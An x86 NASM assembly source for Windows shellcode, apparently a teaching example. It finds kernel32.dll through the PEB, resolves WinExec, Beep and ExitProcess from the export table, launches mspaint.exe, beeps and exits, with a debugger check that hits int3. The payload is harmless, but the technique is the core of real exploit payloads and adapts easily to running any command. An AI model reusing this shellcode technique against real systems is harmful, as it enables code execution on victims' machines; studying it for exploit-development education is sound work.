[BITS 32]
extern Beep

mov eax, [fs:0x30] 		; grab the Process Environment Block (PEB)
cmp byte [ eax + 2], 0x01 	; see if we are being debugged
jnz NODEBUG
int3				; set a breakpoint to help troubleshoot
NODEBUG:

mov eax, [ eax + 0x0c ]  	; grab the PEB_LDR_DATA pointer
mov eax, [ eax + 0x14 ]  	; grab the InMemoryOrderModuleList
LOP:
cmp word [ eax + 0x24 ], 0x18 	; looking for KERNEL32.dll which is 0x18 bytes in length
				; this is a UNICODE version so take ASCII length * 2
jz CHECKNAME			; if the size is 0x18, then it *could* be kernel32.dll
RETRY:
mov eax, [ eax ]		; not kernel32.dll, move to the next entry
jmp LOP				; and try again

CHECKNAME:
mov ecx, [ eax + 0x28 ]  	; grab the base name of the dll (hopefully KERNEL32.dll)
cmp dword [ ecx ], 0x0045004b	; compare with 'KE' unicode
jnz RETRY			; if it's not, try the next module
cmp dword [ecx + 4], 0x004e0052	; compare with 'RN' unicode
jnz RETRY			; if it's not, try the next module
mov edi, [ eax + 0x10 ] 	; OK, it is KERNEL32! get the base address of KERNEL32
mov ecx, [ edi + 0x3c ] 	; Get the PE offset
add ecx, edi  			; get the PE header (the offsets are RVAs)
mov ecx, [ ecx + 0x78 ] 	; get the IMAGE_EXPORT_DIRECTORY offset
add ecx, edi			; add to base (the offsets are RVAs)
mov edx, [ ecx + 0x14 ] 	; get the #of names, so that we know when to stop
xor esi, esi			; our counter, which will be used to lookup in the ordinal table
mov ebp, [ ecx + 0x20 ] 	; get the function names so we can search for our two functions
add ebp, edi			; add to base (the offsets are RVAs)
TRYAGAIN:
mov eax, [ ebp + esi*4 ]	; grab the next name RVA
add eax, edi			; add to base (the offsets are RVAs)

cmp dword [ eax + 0x1 ], 'inEx'	; compare the name looking for WinExec
jz GETFUNC			; this is WinExec!
cmp dword [ eax + 0x2 ], 'itPr'	; compare the name looking for ExitProcess
jz GETFUNC			; this is ExitProcess!
cmp dword [ eax + 0x0 ], 'Beep'	; compare the name looking for Beep
jnz NOTAFUNC			; if it's not move to the next function name

GETFUNC:
mov ebx, [ ecx + 0x24 ] 	; get the ordinals
add ebx, edi			; add to base (the offsets are RVAs)
movzx ebx, word [ ebx + esi*2 ] ; get the index into the function ptr table
				; from the ordinal table
mov eax, [ ecx + 0x1c ] 	; get the functions table
add eax, edi			; add to the base (the offsets are RVAs)
mov ebx, [ eax + ebx*4 ] 	; get the function pointer
add ebx, edi
push ebx			; save it to the stack for later use!
NOTAFUNC:
inc esi				; increment our counter
cmp esi, edx			; see if we are still within
jl TRYAGAIN



call HERE
HERE:
pop esi

pop edi				; WinExec

mov ecx, esi
add ecx, (paint-HERE)
push 6
push ecx
call edi


pop edi
mov ebx, edi
pop edi
push 10000 ; This is how long it do
push 16402 ; This is how it wiggle (0x25+0x7fff)/2
call edi
push ebx

pop edi
push 0x3737 
call edi ; ExitProcess



paint:
db 'mspaint.exe',0
end_paint: